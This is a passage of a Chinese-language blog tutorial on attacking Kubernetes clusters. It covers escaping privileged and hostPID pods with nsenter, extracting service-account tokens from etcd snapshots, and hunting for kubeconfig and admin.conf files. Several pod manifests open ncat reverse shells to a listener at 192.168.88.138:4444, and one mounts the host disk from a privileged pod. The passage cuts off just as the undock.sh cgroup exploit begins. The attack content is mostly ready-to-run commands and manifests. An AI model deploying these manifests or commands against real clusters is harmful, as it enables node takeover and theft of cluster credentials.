+<p>反弹得到的 shell：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524378.png-water_print" /></p>
+<h4 id="412-后渗透">4.1.2 后渗透</h4>
+<h5 id="4121-寻找-token">4.1.2.1 寻找 token</h5>
+<p>通过如上方式获取到 control-pannel 节点后，可以从etcd 中读取数据，一种优雅的方式是通过安装 ectd 客户端进行连接，下面介绍一种简易方式：</p>
+<ul>
+<li>查看 etcd 数据库文件路径：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ps -ef <span class="p">|</span> grep etcd <span class="p">|</span> sed s/<span class="se">\-\-</span>/<span class="se">\\</span>n/g <span class="p">|</span> grep data-dir
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524911.png-water_print" /></p>
+<ul>
+<li>查看数据库文件内容</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">strings /var/lib/etcd/member/snap/db <span class="p">|</span> less
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>从数据库中获取 sa 名称，并提取 token：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">etcd</span><span class="o">=</span><span class="sb">`</span>strings /var/lib/etcd/member/snap/db<span class="sb">`</span><span class="p">;</span> <span class="k">for</span> x in <span class="sb">`</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$etcd</span><span class="s2">&#34;</span> <span class="p">|</span> grep eyJhbGciOiJ<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nv">name</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$etcd</span><span class="s2">&#34;</span> <span class="p">|</span> grep <span class="nv">$x</span> -B40 <span class="p">|</span> grep registry<span class="sb">`</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$name</span> <span class="se">\|</span> <span class="nv">$x</span><span class="p">;</span> echo<span class="p">;</span> <span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524989.png-water_print" /></p>
+<ul>
+<li>获取一些默认 token：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">etcd</span><span class="o">=</span><span class="sb">`</span>strings /var/lib/etcd/member/snap/db<span class="sb">`</span><span class="p">;</span> <span class="k">for</span> x in <span class="sb">`</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$etcd</span><span class="s2">&#34;</span> <span class="p">|</span> grep eyJhbGciOiJ<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nv">name</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$etcd</span><span class="s2">&#34;</span> <span class="p">|</span> grep <span class="nv">$x</span> -B40 <span class="p">|</span> grep registry<span class="sb">`</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$name</span> <span class="se">\|</span> <span class="nv">$x</span><span class="p">;</span> echo<span class="p">;</span> <span class="k">done</span> <span class="p">|</span> grep kube-system <span class="p">|</span> grep default
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>在 pods 中直接查看挂载的 token</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /var/run/secrets/kubernetes.io/serviceaccount/token
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291524890.png-water_print" /></p>
+<blockquote>
+<p>⚠️在 kubernetes 1.24 开始，创建 serviceaccount 不会自动生成 secret，在 pods 中获取的 token 属于集群自动生成，且有 1h 的有效期。</p>
+</blockquote>
+<h5 id="4122-寻找-kubeconfigs">4.1.2.2 寻找 kubeconfigs</h5>
+<p>kubeconfig是集群的配置文件，每个集群内的用户通过各种集群内置或者自定义的角色绑定一定的权限。通过 kuberconfig文件，将可以在任意一台服务器上进行 kubernetes 集群的管理，仅仅需要一个 kubernetes 集群的 kubectl 客户端即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -name kubeconfig
+</span></span><span class="line"><span class="cl">find / -name kubelet.conf
+</span></span><span class="line"><span class="cl">ls /etc/kubernetes/admin.conf
+</span></span><span class="line"><span class="cl">find / -name .kube
+</span></span><span class="line"><span class="cl">grep -R <span class="s2">&#34;current-context&#34;</span> /home/
+</span></span><span class="line"><span class="cl">grep -R <span class="s2">&#34;current-context&#34;</span> /root/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525928.png-water_print" /></p>
+<h3 id="42-开放-privileged--hostpid-权限">4.2 开放 Privileged &amp; HostPid 权限</h3>
+<p>在这种情况下，与上一个场景下的 pod 相比，唯一的变化是如何获得主机的 root 访问权限。攻击者在无法通过 chroot 到宿主机的文件系统时，可以使用 nsenter 在运行 pod 的节点上获取 shell 权限。</p>
+<p>nsenter 是一个 Linux 命令行工具，用于进入已有的命名空间，可以在指定进程的命令空间下运行指定的命令。命名空间是一种隔离机制，用于隔离进程的资源，而容器是通过命名空间进行资源隔离的。通过使用 nsenter 命令，可以进入已经存在的命名空间，并在该命名空间中执行命令或查看其状态。</p>
+<ul>
+<li>特权容器（<code>privileged: true</code>）在容器层面上几乎打破了容器本应提供的所有隔离。PID 命名空间是少数仍然存在的隔离墙之一。然而，没有 <code>hostPID</code>，<code>nsenter</code> 仅能用于进入容器内运行的进程的命名空间。</li>
+<li>当同时设置 <code>hostPID: true</code> 和 <code>privileged: true</code> 时，Pod 将能够看到主机上的所有进程，并且你可以进入主机上的 init 系统（PID 1），并在节点上执行你的 shell。</li>
+</ul>
+<h4 id="421-获取-shell">4.2.1 获取 shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-hostpid-exec-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-hostpid-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">tty</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;nsenter&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--target&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--mount&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--uts&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--ipc&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--net&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--pid&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;bash&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建好 pods 后直接 <code>kubectl exec -it priv-hostpid-exec-pod -- bash</code> 即可获取宿主机 root 权限。</p>
+<p>同样的，如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-hostpid-revshell-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostPID</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-and-hostpid-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.138 4444 -e &#39;/usr/bin/nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash&#39;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525169.png-water_print" /></p>
+<h4 id="422-后渗透">4.2.2 后渗透</h4>
+<p>关于后渗透的部分可以参考前面的场景，在此不做赘述。</p>
+<h3 id="43-开放-privilege-权限">4.3 开放 Privilege 权限</h3>
+<p>当仅拥有 Privilege 权限时，有如下两种方式可以获取集群权限：</p>
+<ul>
+<li>挂载宿主机文件系统：在特权模式下，宿主机上的 <code>/dev</code> 在 Pod 内是可访问的。可以使用 mount 命令将包含宿主机文件系统的磁盘挂载到 Pod 中。但是针对一些高权限路径，并不能在特权 Pod 内可访问。</li>
+<li>利用 cgroup 漏洞：通过一些利用脚本，如 <a href="https://twitter.com/_fel1x/status/1151487051986087936" title="undock.sh" target="_blank" rel="noopener noreffer">undock.sh</a> 等获取 root权限。</li>
+</ul>
+<h4 id="431-获取-shell">4.3.1 获取 shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-exec-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;while true; do sleep 30; done;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样的，如果我们所在的 pods 没有 <code>pods/exec</code> 权限，可以采取反弹 shell 的方式获取 shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-revshell-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">labels</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">app</span><span class="p">:</span><span class="w"> </span><span class="l">prod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">priv-pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">raesene/ncat</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">privileged</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;--&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w"> </span><span class="s2">&#34;ncat 192.168.88.138 4444 -e /bin/bash;&#34;</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">nodeName</span><span class="p">:</span><span class="w"> </span><span class="l">k8s-master</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="432-后渗透">4.3.2 后渗透</h4>
+<p>查看宿主机文件系统：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl <span class="nb">exec</span> -it priv-exec-pod -- fdisk -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291525762.png-water_print" /></p>
+<p>可以看到 <code>sda3</code> 是宿主机的文件系统，直接挂载宿主机文件系统：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl <span class="nb">exec</span> -it priv-exec-pod -- mkdir /host
+</span></span><span class="line"><span class="cl">kubectl <span class="nb">exec</span> -it priv-exec-pod -- bash -c <span class="s2">&#34;mount /dev/sda3 /host/&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526228.png-water_print" /></p>
+<p>然后可以在这些文件系统中搜索一些敏感文件，如token等：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526962.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526376.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526376.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526376.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526376.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202311291526376.png-water_print"
+        title="获取高权限 token" /></p>
+<p>具体方法同前面场景，在此不做赘述。</p>
+<p>那么，如何通过 cgroup 命令执行呢？</p>
+<h5 id="4321-undocksh-执行命令">4.3.2.1 undock.sh 执行命令</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
